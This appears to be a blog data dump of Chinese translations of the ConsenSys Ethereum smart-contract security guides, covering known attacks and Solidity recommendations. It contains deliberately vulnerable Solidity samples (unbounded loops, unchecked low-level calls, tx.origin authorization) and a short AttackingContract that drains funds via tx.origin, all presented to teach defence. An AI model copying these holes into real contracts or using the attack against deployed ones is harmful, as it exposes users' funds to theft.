class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">address[] private refundAddresses;</span><br><span class=\"line\">mapping(address =&gt; uint) public refunds;</span><br><span class=\"line\"></span><br><span class=\"line\">// bad</span><br><span class=\"line\">function refundAll() public &#123;</span><br><span class=\"line\">\tfor (uint x; x &lt; refundAddresses.length; x++) &#123; // // arbitrary length iteration based on how many addresses participated</span><br><span class=\"line\">\t\trequire(refundAddresses[x].send(refunds[refundAddresses[x]])) // doubly bad, now a single failure on send will hold up all funds</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再一次，推荐的解决方法是 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls\" target=\"_blank\" rel=\"noopener\">赞成拉推支付</a>。</p>\n<h3 id=\"区块燃料限制导致的-DoS\"><a href=\"#区块燃料限制导致的-DoS\" class=\"headerlink\" title=\"区块燃料限制导致的 DoS\"></a>区块燃料限制导致的 DoS</h3><p>你可能注意到了之前的例子中的另一个问题：一次性支付给所有人，你会有触及区块燃料限制的风险。每一个以太坊区块都能处理一个确定的最大算力值。如果你想要超过它，那你的交易就会失败。</p>\n<p>即使没有故意的攻击，这也会造成问题。但是，如果攻击者可以操纵所需的燃料值，就会特别糟糕。在之前的例子中，攻击者可以添加大量地址，每一个都需要获得极销量的退款。攻击者的每一个地址退款操作的燃气消耗最终可能超过燃料限制，从而阻止退款交易的发生。</p>\n<p>这是另一个 <a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations#favor-pull-over-push-for-external-calls\" target=\"_blank\" rel=\"noopener\">赞成推拉支付</a> 的原因。</p>\n<p>如果你必须完全遍历一个你不知道大小的数组，那么你应该计划它可能需要多个区块，因而需要多个交易。你会需要对你当前的进度保持跟踪，并且能够从那个点恢复，就像下面这个例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Payee &#123;</span><br><span class=\"line\">\taddress addr;</span><br><span class=\"line\">\tuint256 value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Payee[] payees;</span><br><span class=\"line\">uint256 nextPayeeIndex;</span><br><span class=\"line\"></span><br><span class=\"line\">function payOut() &#123;</span><br><span class=\"line\">\tuint256 i = nextPayeeIndex;</span><br><span class=\"line\">\twhile (i &lt; payees.length &amp;&amp; msg.gas &gt; 200000) &#123;</span><br><span class=\"line\">\t\tpayees[i].addr.send(payees[i].value);</span><br><span class=\"line\">\t\ti++;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tnextPayeeIndex = i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>你会需要确认在等待 <code>payOut()</code> 函数的下一个遍历的时候，如果其他交易被处理，不会有不好的事情发生。所以只在完全必要的时候使用这个模式。</p>\n<h3 id=\"强制将-ETH-发送到合约\"><a href=\"#强制将-ETH-发送到合约\" class=\"headerlink\" title=\"强制将 ETH 发送到合约\"></a>强制将 ETH 发送到合约</h3><p>可以不通过触发合约的 fallback 函数来强行将 ETH 发送到合约。当 fallback 函数内有重要的逻辑或者进行了基于合约余额的计算时，这是一个很重要的考虑。见下面的例子：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Vulnerable &#123;</span><br><span class=\"line\">\tfunction () payable &#123;</span><br><span class=\"line\">\t\trevert();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction somethingBad() &#123;</span><br><span class=\"line\">\t\trequire(this.balance &gt; 0);</span><br><span class=\"line\">\t\t// do something bad</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>合约逻辑看起来并不允许合约被支付，因此也不允许 “一些坏事” 发生。但是，存在一些强制发送 ETH 给合约的方法，因此它的余额大于 0。</p>\n<p>合约方法 <code>selfdestruct</code> 允许用户指定一个受益人发送多余的 ETH。<code>selfdestruct</code> <a href=\"https://solidity.readthedocs.io/en/develop/security-considerations.html#sending-and-receiving-ether\" target=\"_blank\" rel=\"noopener\">不会触发合约的 fallback 函数</a>。</p>\n<p>也可以<a href=\"https://github.com/Arachnid/uscc/tree/master/submissions-2017/ricmoo\" target=\"_blank\" rel=\"noopener\">预先计算</a>合约的地址，然后在合约部署之前给那个地址发送 ETH。</p>\n<p>合约开发者应该注意 ETH 可以被强制发送给合约并且应该设计相应的合约逻辑。通常来说，假设不可能限制你的合约的资金来源。</p>\n<h3 id=\"废弃的-历史的攻击\"><a href=\"#废弃的-历史的攻击\" class=\"headerlink\" title=\"废弃的 / 历史的攻击\"></a>废弃的 / 历史的攻击</h3><p>这些攻击由于协议的改变或固体的改进而不再可能发生。</p>\n<h4 id=\"调用深度攻击（废弃）\"><a href=\"#调用深度攻击（废弃）\" class=\"headerlink\" title=\"调用深度攻击（废弃）\"></a>调用深度攻击（废弃）</h4><p>在 EIP 150 的硬分叉中，调用深度攻击不再相关*（在达到 1024 调用深度限制之前，所有气体都将消耗得很好）。</p>\n"},{"title":"智能合约最佳实践翻译二","comments":0,"date":"2018-03-02T09:04:23.000Z","img":null,"_content":"\n[原文链接](https://consensys.github.io/smart-contract-best-practices/recommendations/)\n\n## 对 Solidity 中的智能合约的安全推荐 Recommendations for Smart Contract Security in Solidity\n\n本页面展示了编写智能合约时应遵循的一些 solidity 模式。\n\n### 协议具体建议\n\n以下建议适用于以太坊中所有的智能合约的开发。\n\n### 外部调用\n\n#### 小心使用外部调用\n\n调用不受信任的合约会引入一些预期外的风险或错误。外部调用可能会在该合约或其依赖的任何其他合约中执行恶意代码。所以每个外部调用都要被当做潜在的安全风险来对待。如果不可能或不希望删除外部调用，请使用本节其余部分的建议来减少危险\n\n#### 标记不受信任的合约\n\n当与外部合约交互的时候，通过某种形式命名你的变量，方法和合约接口来清楚地表达其所交互的对象是具有潜在性的安全问题的。这适用于你的调用外部合约的函数。\n\n```\n// bad\nBank.withdraw(100); // Unclear whether trusted or untrusted\n\n// Isn't clear that this function is potentially unsafe\nfunction makeWithdrawal(uint amount)  {\n\t\tBank.withdraw(amount);\n}\n\n// good\nUntrustedBank.withdraw(100);\nTrustedBank.withdraw(100);\n\nfunction makeUntrustedWithdrawal(uint amount) {\n\t\tUntrustedBank.withdraw(amount);\n}\n```\n\n#### 避免在外部调用之后改变状态\n\n不论是否使用 `raw calls`（`someAddress,call()` 的格式） 或者 `contract calls`（`ExternalContract.someMethod()` 的格式），都假定会执行恶意代码。即使 `ExternalContract` 不是恶意的，但它调用的任何合约也可能会执行恶意代码。\n\n一个特殊的危险是，恶意代码可能对控制流进行了 `hijack` 攻击，导致条件竞争。（见 [Race Conditions](https://consensys.github.io/smart-contract-best-practices/known_attacks/#race-conditions) 了解更多关于这个问题的讨论）。\n\n如果你调用了一个不受信任的外部合约，*避免在调用之后改变状态*。这个模式也常常作为 [check-effects-interactions 模式](https://solidity.readthedocs.io/en/develop/security-considerations.html?highlight=check%20effects#use-the-checks-effects-interactions-pattern) 为人们所知。\n\n#### 注意 `send() / transfer() / call.value()` 之间的平衡\n\n在发送 ether 时注意 `someAddress.send() / someAddress.transfer() / someAddress.call.value()()` 之间的使用的关系的平衡。\n\n* `someAddress.send()` 和 `someAddress.transfer()` 被认为对于[重入](https://consensys.github.io/smart-contract-best-practices/recommendations/#reentrancy)是安全的。尽管这些方法仍然会触发代码的执行，但是被调用的合约只会被提供 2300 单位的燃料，目前来说，这么多的燃料足够用来记录事件了。\n* `x.transfer(y)` 和 `require(x.send(y));` 的等同的，如果发送失败，它会自动回退。\n* `someAddress.call.value(y)()` 会发送提供的以太币，然后触发代码的执行。为执行的代码提供所有可用来执行的燃料使得这种转账方式对于重入来说很不安全。\n\n使用 `send()` 和 `transfer()` 可以防止重入，但是这样的做法会使得与那些 fallback 函数的消耗超过 2300 单位燃料的合约不兼容。也可以使用 `someAddress.vall.value(ethAmount).gas(gasAmount)()` 来转发指定的燃料数量。\n\n一个试图平衡这个问题的解决办法是实现 *[退和拉](https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-payments)* 的机制模式， *推送* 部分使用 `send()` 或者 `transfer()` ，*拉* 部分使用 `call.value()` 。\n\n值得指出的是，对于价值转移而言，专用 `send()` 或者 `transfer()` 并不能使得合约避免重入的安全问题，但是能够使得一些特定的转账避免重入的安全问题。\n\n#### 解决外部调用的错误\n\nSolidity 提供了处理原生地址的底层调用方法：`address.call()`，`address.callcode()`，`address,delegatecall()`，和 `address.send()`。当调用遇到一个异常的时候，这些底层方法不会抛出一个异常，而是返回一个 `false`。从另一方面来说，*合约调用*（如 `ExternalContract.doSomething()`）会自动传播一个异常（比如，如果 `doSomething()` 抛出异常，`ExternalContract.doSomething()` 也会 `throw`）。\n\n如果你选择使用底层调用方法，要确定你通过检查返回值，处理了可能存在的调用失败的情况。\n\n```\n// bad\nsomeAddress.send(55);\nsomeAddress.call.value(55)(); // this is doubly dangerous, as it will forward all remaining gas and doesn't check for result\nsomeAddress.call.value(100)(bytes4(sha3(\"deposit()\"))); // if deposit throws an exception, the raw call() will only return false and transaction will NOT be reverted\n\n// good\nif (!someAddress.send(55)) {\n\t\t// some failure code\n}\n\nExternalContract(someAddress).deposit.value(100);\n```\n\n#### 对外部调用来说，拉比推更好\n\n外部调用可能有意无意而失败。为了最小化这样失败带来的破坏，通常最好将每个外部调用隔离到可以由调用接收方发起的自己的交易中。这与支付特别相关，与将资金自动推给用户比起来，更好的是让用户提取资金。（这也减少了[燃料限制问题](https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-block-gas-limit)。）避免在单个交易中组合多个 `send()` \n\n```\n// bad\ncontract auction {\n\taddress highestBidder;\n\tuint highestBid;\n\n\tfunction bid() payable {\n\t\trequire(msg.value >= highestBid);\n\n\t\tif (highestBidder != 0) {\n\t\t\thighestBidder.transfer(highestBid); // if this call consistently fails, no one else can bid \n\t\t}\n\n\t\thighestBidder = msg.sender;\n\t\thighestBid = msg.value;\n\t}\n}\n\n// good\ncontract auction {\n\taddress highestBidder;\n\tuint highestBid;\n\tmapping(address => uint) refunds;\n\n\tfunction bid() payable external {\n\t\trequire(msg.value >= highestBid);\n\n\t\tif (highestBidder != 0) {\n\t\t\trefunds[highestBidder] += highestBid; // record the refund that this user can claim\n\t\t}\n\n\t\thighestBidder = msg.sender;\n\t\thighestBid = msg.value;\n\t}\n\n\tfunction withdrawRefund() external {\n\t\tuint refund = refunds[msg.sender];\n\t\trefunds[msg.sender] = 0;\n\t\tmsg.sender.transfer(refund);\n\t}\n}\n```\n\n#### 不要假设合约创建时是 0 资产\n\n一个攻击者可以在合约创建之前发送 wei 到合约的地址。合约不应该假设初始状态包含 0 资产。见 [问题 61](https://github.com/ConsenSys/smart-contract-best-practices/issues/61) 查看更多细节。\n\n#### 记住链上的数据是公开的\n\n许多应用程序要求提交数据以便在某个时间点可以供其工作。游戏（如链上的石头剪子布）和拍卖机制（如 盲派的第二次出价）是两种主要类别的例子。如果你正在构建一个涉及到隐私的应用，注意不免要求用户过早发布信息。\n\n示例：\n* 在石头剪子布中，首先要求两个玩家同时提交他们的出手意图的哈希值，然后再要求提交他们的实际出手，如果匹配不上之前的哈希值，则抛出。\n* 在一个拍卖中，要求玩家在初始阶段提交他们的出价金额的哈希值（保证金高于他们的竞价），然后在第二阶段提交他们的实际竞价。\n* 当开发一个依赖于随机数生成器的应用时，顺序应该总是（1）提交行动，（2）生成随机数，（3）玩家付出。随机数生成方法本来就是一个活跃的研究领域；目前同类最佳的解决方案包括比特币区块头（通过 [http://btcrelay.org](http://btcrelay.org) 来验证），散列提交揭示方案（即一方产生一个数字，将其散列值发布为”提交“的值，然后揭示这个数）和 [RANDAO](https://github.com/randao/randao)\n* 如果你正在实现一个频繁的批量拍卖，哈希提交方案也很合适。\n\n### 注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\n\n不要只依赖于特定方执行特定行动的退款或者索赔流程，而没有其他获得资金的方式。比如，在剪刀石头布游戏中，一个常见的错误是在两位玩家提交它们的行动之前，没有进行支付；然而，一个恶意的玩家可以简单地通过不提交他的动作来使得另一位玩家陷入困境 - 实际上，如果一个玩家看到了其他玩家暴露的行为，并且确定他们输了，他们就没有任何理由去提交他们自己的行为。这个问题也可能出现在状态渠道的解决中。当这样的场景变成一个问题，（1）提供一种规避未参与的参与者的方式，可能是通过限制时间，（2）考虑增加额外的经济激励，让参与者在需要提交信息的场景中提交所有该场景需要的信息。\n\n### Solidity 详细建议\n\n下面的建议对于 Solidity 来说十分详细，不过对于使用其他语言来开发智能合约来说，应该也是有所帮助的。\n\n### 强制对不变值使用 `assert()`\n\n当一个断言失败的时候，它的保护机制就会被触发 - 比如当一个不变的属性改变的时候。比如，在一个代币发行合约中，代币与以太币的汇率可能是固定的。然后你可以通过 `assert()` 来验证所有的这种情况。断言保护机制应该经常与其他技术结合，如暂停合约和允许升级。（否则，你可能会陷入停滞，而一个断言总是在失败。）\n\n例子：\n\n```\ncontract Token {\n\tmapping (address => uint) public balanceOf;\n\tuint public totalSupply;\n\n\tfunction deposit() public payable {\n\t\tbalanceOf[msg.sender] += msg.value;\n\t\ttotalSupply += msg.value;\n\t\tassert(this.balance >= totalSupply);\n\t}\n}\n```\n\n注意断言并非对资产严格相等，因为合约可以不通过 `deposit` 函数强制[发送以太币](https://consensys.github.io/smart-contract-best-practices/recommendations/#ether-forcibly-sent)\n\n### 正确地使用 `assert()` 和 `require()`\n\n在 Solidity 0.4.10 中，引入了 `assert()` 和 `require()`。`require(condition)` 被用来对用户的任何输入进行验证，如果条件不成立则回滚。`assert(condition)` 在条件不成立时也会回滚，但是只用在不变值上：内部错误或者检查你的合约是否是非法的状态。遵循这种范式将允许形式分析工具来进行验证工作，而非法的操作码永远不会到达：这意味着代码中的任何不变值都不会被违反，并且代码正确地验证。\n\n### 小心整数除法\n\n所有整数除法都被向下取整。如果你需要更高的精度，考虑使用乘数，或者存储分子和分母。\n\n（在未来，Solidity 会有定点类型，这会使得整数除法更容易。）\n\n```\n// bad\nuint x = 5 / 2; // Result is 2, all integer divison rounds DOWN to the nearest integer\n```\n\n使用乘数来防止向下取整，当使用 x 的时候要考虑到这个乘数：\n\n```\n// good\nuint multiplier = 10;\nuint x = (5 * multipler) / 2;\n```\n\n存储分子和分母意味着你可以离链计算分子除以分母的结果。\n\n```\n// good\nuint numerator = 5;\nuint denominator = 2;\n```\n\n### 记住以太币可以被强制发送到一个账户\n\n注意对严格检查了的合约的余额进行编码。\n\n一个攻击者可以强制对任何账户发送 wei，而且这不能被阻止（即使是使用了 `revert()` 的 fallback 函数也不可以）\n\n攻击者通过创余额为 1 wei 的合约，然后通过 `selfdestruct(victimAddress)` 的方式达到目的。`victimAddress` 中没有代码被激活，所以这不能被阻止。\n\n### 注意抽象合约和接口的平衡\n\n接口和抽象合约都为智能合约提供了一种定制的，可复用的方式。接口，在 Solidity 0.4.11 中被引入，与抽象合约十分相似，但是接口不能有已经实现的方法。接口同样也有限制，它不能访问存储，不能继承其他接口，而这通常使得抽象合约更加实用。虽然，接口实际上对设计合约的实现上十分有用。另外，十分重要的是如果一个合约继承了一个抽象合约，那它必须通过重写来实现所有抽象合约中未实现的函数，否则它依旧是一个抽象合约。\n\n### 保持 fallback 函数简单\n\n当一个合约发送了没有参数（或者当没有函数匹配上的时候）的消息时，[Fallback 函数](https://solidity.readthedocs.io/en/latest/contracts.html#fallback-function) 会被调用，而且如果通过 `.send()` 或者 `.transfer()` 调用的话只需要 2300 单位的燃料。如果你希望能够从 `.send()` 或者 `.transfer()` 接受以太币，你能做的就是在 fallback 函数中记录一个日志。如果需要计算，或者更多的燃料，就使用一个真正的函数。\n\n```\n// bad\nfunciton() payable { balances[msg.sender] += msg.value; }\n\n// good\nfunction deposit() payable external { balances[msg.sender] += msg.value; }\n\nfunction() payable { LogDepositReceived(msg.sender); }\n```\n\n### 为函数和状态变量显式标记可见性\n\n显式标记函数和状态变量的可见性。函数可以被指定为 `external / public / internal / private`。请理解它们之间的区别，比如，比起 `public`，`external` 可能已经足够使用了。对于状态变量来说，`external` 是不可能的。显式标记可见性将更容易捕捉有关谁可以调用函数或访问变量的错误假设。 \n\n```\n// bad\nuint x; // the default is internal for state variables, but it should be made explicit\nfunction buy() { // the default is public \n\t\t// public code\n}\n\n// good\nuint private y;\nfunction buy() external {\n\t\t// only callable external\n}\n\nfunction utility() public {\n\t\t// callable externally, as well as internally: changing this code requires thinking about both cases\n}\n\nfunction internalAction() internal {\n\t\t// internal code\n}\n```\n\n### 锁定指定编译器版本的编译指示\n\n应该使用相同的编译器版本部署合同，并标记它们已经经过了足够的测试。锁定编译指示可以帮助确保合约不会意外部署，比如，最新的编译器对未知错误有更高的风险。合约也可能由其他人部署，通过编译指示就知道原作者打算使用的编译器版本。\n\n```\n// bad \npragma solidity ^0.4.4;\n\n// good\npragma solidity 0.4.0;\n```\n\n#### 异常\n\n当合约打算供其他开发人员使用时，可以允许 `pragma` 语句浮动，例如类库或者 EthPM 包。否则，开发人员为了在本地编译就需要手动更新编译指示。\n\n### 函数和事件的区别\n\n对事件名首字母大写,以及添加作用前缀，来防止对函数和事件产生困惑。对于方法来说，总是以小写字母开头，除了构造函数之外。\n\n```\n// bad \nevent Transfer() {}\nfunction transfer() {}\n\n// good\nevent LogTransfer() {}\nfunction transfer() external {}\n```\n\n### 推荐使用更新的 Solidity 结构\n\n使用构造/别名如 `selfdestruct` （而不是 `suicide`），和 `keccak256` （而不是 `sha3`）。`require(msg.sender.send(1 ether))` 也可以使用 `transfer()` 简单地实现： `msg.sender.transfer(1 ether)`。\n\n### 注意内置函数可以被覆盖\n\n目前可以在 Solidity 覆盖（[shadow](https://en.wikipedia.org/wiki/Variable_shadowing)）内置的全局变量。它允许合约重写覆盖内置的方法，如 `msg` 和 `revert()`。尽管这是[故意](https://github.com/ethereum/solidity/issues/1249)的，但是它可能会在关于合约的真实行为上误导合约的用户。\n\n```\ncontract PretendingToRevert {\n\tfunction revert() internal constant {}\n}\n\ncontract ExampleContract is PretendingToRevert {\n\tfunction somethingBad() public {\n\t\trevert();\n\t}\n}\n```\n\n合约用户（和审计人员）应该注意他们想要使用的应用的所有合约源代码。\n\n### 避免使用 `tx.origin`\n\n永远不要使用 `tx.origin` 进行授权，另一个合约可以有一种方法来调用你的合约（比如用户有一些资金），而因为你的地址在 `tx.origin` 里面，你的合约就会授权该交易。\n\n```\npragma solidity ^0.4.18;\n\ncontract MyContract {\n\taddress owner;\n\n\tfunction MyContract() public {\n\t\towner = msg.sender;\n\t}\n\n\tfunction sendTo(address receiver, uint amount) public {\n\t\trequire(tx.origin == owner);\n\t\treceiver.transfer(amount);\n\t}\n}\n\ncontract AttackingContract {\n\tMyContract myContract;\n\taddress attacker;\n\n\tfunction AttackingContract(address myContractAddress) public {\n\t\tmyContract = MyContract(myContractAddress);\n\t\tattacker = msg.sender;\n\t}\n\n\tfunction() public {\n\t\tmyContract.sendTo(attacker, msg.sender.balance);\n\t}\n}\n```\n\n你应该使用 `msg.sender` 来授权（如果有另一个合约调用了你的合约，`msg.sender` 会成为合约的地址，而且不是调用合约的人的地址）。\n\n更多可见 [Solidity 文档](https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin)\n\n除了授权的这个问题，`tx.origin` 可能在将来从以太坊协议中移除，所以使用了 `tx.origin` 的代码在将来不会再被兼容 [Vitalik: 'Do NOT assume that tx.origin will continue to be usable or meaningful.'](https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof/200#200)\n\n另外值得一提的是，通过使用 `tx.origin`，你会限制合同之间的互操作性，因为使用 `tx.origin` 的合同不能被另一个合同使用，因为合同不能是 `tx.origin`。\n\n### 时间戳依赖\n\n在合同中使用时间戳执行关键功能时有三个主要考虑因素，特别是当涉及到资金转移时。\n\n#### Gameability\n\n注意区块的时间戳是可用被矿工操作的。考虑这个[合约](https://etherscan.io/address/0xcac337492149bdb66b088bf5914bedfbf78ccc18#code)：\n\n```\nuint256 constant private salt = block.timestamp;\n\nfunction random(uint Max) constant private returns (uint256 result) {\n\t//get the best seed for randomness\n\tuint256 x = salt * 100/Max;\n\tuint256 y = salt * block.number/(salt % 5);\n\tuint256 seed = block.number/3 + (salt % 300) + Last_Payout + y;\n\tuint256 h = uint256(block.blockhash(seed));\n\n\treturn uint256((h / x)) % Max + 1; // random number between 1 and Max\n}\n```\n\n当合约使用时间戳来产生随机数时，矿工实际上可以在被验证块的 30 秒内发布时间戳，从而有效地允许矿工预先计算一个更有利于他们抽奖机会的选项。 时间戳不是随机的，不应该在这种情况下使用。\n\n#### 30 秒规则\n\n评估时间戳使用的一般经验法则是：\n\n**如果合约功能可以容忍30秒的时间漂移，则可以安全使用 `block.timestamp`**\n\n如果您的时间相关事件的比例可以变化 30 秒并保持完整性，则使用时间戳是安全的。 这包括拍卖结束，注册期限等事情。\n\n#### 将 `block.number` 作为时间戳使用时要当心\n\n当合约创建一个 `auction_complete` 修饰器来表示代币销售的结束，像[这样](https://consensys.github.io/smart-contract-best-practices/(https://github.com/SpankChain/old-sc_auction/blob/master/contracts/Auction.sol))\n\n```\nmodifier auction_complete {\n\trequire(auctionEndBlock <= block.number ||\n\t\tcurrentAuctionState == AuctionState.success ||\n\t\tcurrentAuctionState == AuctionState.cancel)\n\t\t_;\n}\n```\n\n`block.number` 和 [平均出块时间](https://etherscan.io/chart/blocktime) 也可以用来估算时间，但是这不是未来的证明，因为区块时间可以修改（例如 [分叉重组](https://blog.ethereum.org/2015/08/08/chain-reorganisation-depth-expectations/) 和 [难度炸弹](https://github.com/ethereum/EIPs/issues/649)）。在一天的销售中，12分钟规则允许人们构建更可靠的时间估计。\n\n### 弃用/历史 建议\n\n由于协议的修改或者 solidity 的提升，这些建议不再相关。They are recorded here for posterity and awareness.\n\n#### 注意被 0 除 （Solidity < 0.4）\n\n在版本 0.4 之前，当一个数字除以 0 时，Solidity 会返回零，并且不会引发异常。 确保你至少运行 0.4 版本。\n","source":"_posts/智能合约最佳实践翻译二.md","raw":"---\ntitle: 智能合约最佳实践翻译二\ncomments: false\ndate: 2018-03-02 17:04:23\ncategories: 智能合约\ntags: \n- ZhouFyk \n- 以太坊 \n- 智能合约 \n- 安全开发\nimg:\n---\n\n[原文链接](https://consensys.github.io/smart-contract-best-practices/recommendations/)\n\n## 对 Solidity 中的智能合约的安全推荐 Recommendations for Smart Contract Security in Solidity\n\n本页面展示了编写智能合约时应遵循的一些 solidity 模式。\n\n### 协议具体建议\n\n以下建议适用于以太坊中所有的智能合约的开发。\n\n### 外部调用\n\n#### 小心使用外部调用\n\n调用不受信任的合约会引入一些预期外的风险或错误。外部调用可能会在该合约或其依赖的任何其他合约中执行恶意代码。所以每个外部调用都要被当做潜在的安全风险来对待。如果不可能或不希望删除外部调用，请使用本节其余部分的建议来减少危险\n\n#### 标记不受信任的合约\n\n当与外部合约交互的时候，通过某种形式命名你的变量，方法和合约接口来清楚地表达其所交互的对象是具有潜在性的安全问题的。这适用于你的调用外部合约的函数。\n\n```\n// bad\nBank.withdraw(100); // Unclear whether trusted or untrusted\n\n// Isn't clear that this function is potentially unsafe\nfunction makeWithdrawal(uint amount)  {\n\t\tBank.withdraw(amount);\n}\n\n// good\nUntrustedBank.withdraw(100);\nTrustedBank.withdraw(100);\n\nfunction makeUntrustedWithdrawal(uint amount) {\n\t\tUntrustedBank.withdraw(amount);\n}\n```\n\n#### 避免在外部调用之后改变状态\n\n不论是否使用 `raw calls`（`someAddress,call()` 的格式） 或者 `contract calls`（`ExternalContract.someMethod()` 的格式），都假定会执行恶意代码。即使 `ExternalContract` 不是恶意的，但它调用的任何合约也可能会执行恶意代码。\n\n一个特殊的危险是，恶意代码可能对控制流进行了 `hijack` 攻击，导致条件竞争。（见 [Race Conditions](https://consensys.github.io/smart-contract-best-practices/known_attacks/#race-conditions) 了解更多关于这个问题的讨论）。\n\n如果你调用了一个不受信任的外部合约，*避免在调用之后改变状态*。这个模式也常常作为 [check-effects-interactions 模式](https://solidity.readthedocs.io/en/develop/security-considerations.html?highlight=check%20effects#use-the-checks-effects-interactions-pattern) 为人们所知。\n\n#### 注意 `send() / transfer() / call.value()` 之间的平衡\n\n在发送 ether 时注意 `someAddress.send() / someAddress.transfer() / someAddress.call.value()()` 之间的使用的关系的平衡。\n\n* `someAddress.send()` 和 `someAddress.transfer()` 被认为对于[重入](https://consensys.github.io/smart-contract-best-practices/recommendations/#reentrancy)是安全的。尽管这些方法仍然会触发代码的执行，但是被调用的合约只会被提供 2300 单位的燃料，目前来说，这么多的燃料足够用来记录事件了。\n* `x.transfer(y)` 和 `require(x.send(y));` 的等同的，如果发送失败，它会自动回退。\n* `someAddress.call.value(y)()` 会发送提供的以太币，然后触发代码的执行。为执行的代码提供所有可用来执行的燃料使得这种转账方式对于重入来说很不安全。\n\n使用 `send()` 和 `transfer()` 可以防止重入，但是这样的做法会使得与那些 fallback 函数的消耗超过 2300 单位燃料的合约不兼容。也可以使用 `someAddress.vall.value(ethAmount).gas(gasAmount)()` 来转发指定的燃料数量。\n\n一个试图平衡这个问题的解决办法是实现 *[退和拉](https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-payments)* 的机制模式， *推送* 部分使用 `send()` 或者 `transfer()` ，*拉* 部分使用 `call.value()` 。\n\n值得指出的是，对于价值转移而言，专用 `send()` 或者 `transfer()` 并不能使得合约避免重入的安全问题，但是能够使得一些特定的转账避免重入的安全问题。\n\n#### 解决外部调用的错误\n\nSolidity 提供了处理原生地址的底层调用方法：`address.call()`，`address.callcode()`，`address,delegatecall()`，和 `address.send()`。当调用遇到一个异常的时候，这些底层方法不会抛出一个异常，而是返回一个 `false`。从另一方面来说，*合约调用*（如 `ExternalContract.doSomething()`）会自动传播一个异常（比如，如果 `doSomething()` 抛出异常，`ExternalContract.doSomething()` 也会 `throw`）。\n\n如果你选择使用底层调用方法，要确定你通过检查返回值，处理了可能存在的调用失败的情况。\n\n```\n// bad\nsomeAddress.send(55);\nsomeAddress.call.value(55)(); // this is doubly dangerous, as it will forward all remaining gas and doesn't check for result\nsomeAddress.call.value(100)(bytes4(sha3(\"deposit()\"))); // if deposit throws an exception, the raw call() will only return false and transaction will NOT be reverted\n\n// good\nif (!someAddress.send(55)) {\n\t\t// some failure code\n}\n\nExternalContract(someAddress).deposit.value(100);\n```\n\n#### 对外部调用来说，拉比推更好\n\n外部调用可能有意无意而失败。为了最小化这样失败带来的破坏，通常最好将每个外部调用隔离到可以由调用接收方发起的自己的交易中。这与支付特别相关，与将资金自动推给用户比起来，更好的是让用户提取资金。（这也减少了[燃料限制问题](https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-block-gas-limit)。）避免在单个交易中组合多个 `send()` \n\n```\n// bad\ncontract auction {\n\taddress highestBidder;\n\tuint highestBid;\n\n\tfunction bid() payable {\n\t\trequire(msg.value >= highestBid);\n\n\t\tif (highestBidder != 0) {\n\t\t\thighestBidder.transfer(highestBid); // if this call consistently fails, no one else can bid \n\t\t}\n\n\t\thighestBidder = msg.sender;\n\t\thighestBid = msg.value;\n\t}\n}\n\n// good\ncontract auction {\n\taddress highestBidder;\n\tuint highestBid;\n\tmapping(address => uint) refunds;\n\n\tfunction bid() payable external {\n\t\trequire(msg.value >= highestBid);\n\n\t\tif (highestBidder != 0) {\n\t\t\trefunds[highestBidder] += highestBid; // record the refund that this user can claim\n\t\t}\n\n\t\thighestBidder = msg.sender;\n\t\thighestBid = msg.value;\n\t}\n\n\tfunction withdrawRefund() external {\n\t\tuint refund = refunds[msg.sender];\n\t\trefunds[msg.sender] = 0;\n\t\tmsg.sender.transfer(refund);\n\t}\n}\n```\n\n#### 不要假设合约创建时是 0 资产\n\n一个攻击者可以在合约创建之前发送 wei 到合约的地址。合约不应该假设初始状态包含 0 资产。见 [问题 61](https://github.com/ConsenSys/smart-contract-best-practices/issues/61) 查看更多细节。\n\n#### 记住链上的数据是公开的\n\n许多应用程序要求提交数据以便在某个时间点可以供其工作。游戏（如链上的石头剪子布）和拍卖机制（如 盲派的第二次出价）是两种主要类别的例子。如果你正在构建一个涉及到隐私的应用，注意不免要求用户过早发布信息。\n\n示例：\n* 在石头剪子布中，首先要求两个玩家同时提交他们的出手意图的哈希值，然后再要求提交他们的实际出手，如果匹配不上之前的哈希值，则抛出。\n* 在一个拍卖中，要求玩家在初始阶段提交他们的出价金额的哈希值（保证金高于他们的竞价），然后在第二阶段提交他们的实际竞价。\n* 当开发一个依赖于随机数生成器的应用时，顺序应该总是（1）提交行动，（2）生成随机数，（3）玩家付出。随机数生成方法本来就是一个活跃的研究领域；目前同类最佳的解决方案包括比特币区块头（通过 